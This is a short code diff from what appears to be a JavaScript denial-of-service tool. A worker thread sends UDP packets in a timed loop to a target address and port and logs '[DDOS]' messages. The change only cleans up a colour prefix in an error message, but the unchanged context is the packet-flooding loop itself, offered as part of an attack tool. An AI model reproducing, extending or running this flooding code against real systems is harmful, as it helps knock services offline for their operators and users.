@@ -10,7 +10,7 @@ parentPort.on('message', async ({ address, port, time, thread }) => {
     task = setInterval(() => {
       client.send('', port, address, (error) => {
         if (error) {
-          console.log(`ANSI_YELLOW+[DDOS] Can't send packet to ${address}:${port} [${error}] : (`)
+          console.log(`[DDOS] Can't send packet to ${address}:${port} [${error}] : (`)
           clearInterval(task);
           console.log(`[DDOS] Stopped!`)
           return;
